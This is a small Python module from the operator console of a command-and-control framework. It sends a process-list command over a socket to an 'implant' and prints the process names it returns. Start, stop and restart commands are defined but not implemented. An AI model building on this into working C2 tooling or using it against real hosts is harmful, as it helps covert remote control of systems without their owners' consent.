# Patrick Sacchet
# Version 1.0
# Serves to implement interfacing with process functionality 

SUCCESS = 1
FAILURE = 0

# Command value
PROCESSLIST = 10
PROCESSTART = 11
PROCESSSTOP = 12
PROCESSRESTART = 13

'''
Description:
    Prints process listing usage for user
Params:
    N/A
Returns:
    SUCCESS or FAILURE  
'''
def printProcessListHelp():
    print("""Required params: \n
                - N/A \n""")
    return SUCCESS


def processQuery():
    return SUCCESS


'''
Description:
    Performs process list functionality; communicates with C2 server and handles responses
Params:
    sock - sock object with connection already established
Returns:
    SUCCESS or FAILURE 
'''
def processList(sock):

    # First tell our implant we want a process list performed
    print("Sending command...")
    sock.send(bytes(str(PROCESSLIST), "utf-8") + b'\x00')

    data = sock.recv(4)

    numProcesses = int.from_bytes(data, 'little')

    print("Implant found %i processes:" % numProcesses)

    # Keep getting processes back until we get our terminator
    while (data != "SUCCESS"):
        # First get length of string
        data = sock.recv(4)
        stringSize = int.from_bytes(data, 'little')

        if (stringSize == 0):
            print("ERROR: received size zero string from implant!")
            return FAILURE
        
        print("Reading %s bytes..." % stringSize)
        data = sock.recv(stringSize)
        data = data.strip()
        data = data.decode('utf-8')
        
        if (data != "" and data != " "):
            print("\t%s" % data)
        if (data == "FAILURE"):
            print("Process list returned failure!")
            return FAILURE
        
    print("\nSuccessful process list!\n")


    return SUCCESS